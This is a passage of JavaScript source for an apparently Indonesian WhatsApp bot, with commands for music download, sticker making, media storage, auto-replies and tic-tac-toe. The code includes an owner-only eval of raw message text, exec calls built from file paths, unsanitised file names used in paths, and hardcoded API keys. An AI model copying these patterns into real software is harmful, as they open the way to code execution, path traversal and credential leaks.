								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"🏴‍☠️ YTMP3",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
					        })
						} catch (err) {
							reply(mess.error.api)
						}
						break
                    case 'play2':
            if (args.length == 0) return reply(`Example: ${prefix + command} vide 1detik`)
            query = args.join(" ")
            get_resultL = await fetchJson(`https://ziy.herokuapp.com/api/play?apikey=xZiyy&judul=${query}`)
            get_resultP = get_resultL.result
            textP =`
*YOUTUBE PLAY*

Judul : ${get_resultP.judul}
Link : ${get_resultP.url_audio}
            `
            kurr.sendMessage(from, textP, text,{contextInfo:{
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
            "title": `Hallo ${pushname}` ,
            "body": `Nih ${query} nya`,
            "mediaType": "2",
            "thumbnailUrl": `${get_resultP.image_thumbnail}`,
            "mediaUrl": "https://youtu.be/8S-AdzinXAI",
            "thumbnail": fs.readFileSync("./thumb.jpg"),
            "sourceUrl": "http://ziy.herokuapp.com"
            },mentionedJid:[sender]}, quoted : mek})
            get_audio = await getBuffer(get_resultP.url_audio)
            kurr.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_resultP.title}.mp3`, quoted: mek})
            break
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
				case 'play':
			    if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
			   sticWait(from)
               var srch = args.join('')
    		   aramas = await yts(srch);
    	   	aramat = aramas.all 
   			var mulaikah = aramat[0].url							
               try {
               yta(mulaikah)
              .then((res) => {
               const { dl_link, thumb, title, filesizeF, filesize } = res
               axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
               if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam baltuk link_`)
               const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
               sendMediaURL(from, thumb, captions)
               await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
					case 'stiker':
					case 's':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							sticWait(from)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'stickerwm':
					case 'swm':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							sticWait(from)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'takestick':
					case 'take':
					case 'wm':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await kurr.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
//stiker work Replit
case 'sticker':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker)) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  kurr.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f0b190d67308d34811fab9c56fe8aba7", owgi)
tekks = `${anu.display_url}`
anu1 = `${tekks}`
sendStickerFromUrl(from, `${anu1}`, mess.success)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker`)
}
break
			case 'speed':
			case 'ping':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Speed: ${latensyi.toFixed(4)} Second`)
					break
				case 'return':
				if (!isOwner) return sticOwner(from)
					return kurr.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return kurr.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await kurr.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await kurr.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							kurr.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break
				case 'ss':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              sticWait(from)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
				break
				case 'addsticker':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await kurr.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					kurr.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					kurr.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await kurr.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					kurr.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					kurr.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await kurr.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					kurr.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					kurr.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await kurr.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./media/sticker/${wanu[1]}.webp`)
				kurr.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				runtime = process.uptime()
				reply(`Runtime : ${waktu(runtime)}`)
				break
			case 'setbio':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					kurr.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'setname':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                kurr.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
                case 'add':
             reply(`MAAF FITURE INI DI NON AKTIFKAN KARNA MENYEBABKAN TERBANNED NYA BOT`)
             break
	
				case 'kick':
             reply(`MAAF FITURE INI DI NON AKTIFKAN KARNA MENYEBABKAN TERBANNED NYA BOT`)
             break
						reply('Sukses mengeluarkan peserta')
                    break
                    case 'creategroup':
			case 'creategrup':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					kurr.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
            case 'welcome': 
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return sticAdmin(from)
					if (args[0] === 'on') {
						if (isWelkom) return reply('Sudah Aktif Kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome')
					} else if (args[0] === 'off') {
						if (!isWelkom) return reply('Sudah Mati Kak')
						var ini = welkom.indexOf(from)
						welkom.splice(ini, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btngrass = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: punten,
    headerType: 1
}
await kurr.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
		default:break
		}
		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran = @${tty.player1.split('@')[0]}`
  kurr.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
kurr.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Result Game Tictactoe 🎲

*Yeyyy Permainan Di Menangkan Oleh *@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
kurr.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri 🗿👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Giliran = @${tty.player2.split('@')[0]}`
 kurr.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*?? Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh *@${tty.player2.split('@')[0]}*\n`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
kurr.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Giliran = @${tty.player1.split('@')[0]}`
 kurr.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
     kurr.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Itz ShinChan",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./thumb.jpg'),sourceUrl:"https://wa.me/assalamualaikum/6282134110253/6282134110253"}}})
	}
    }
    }
    }
    }
    }
    }
    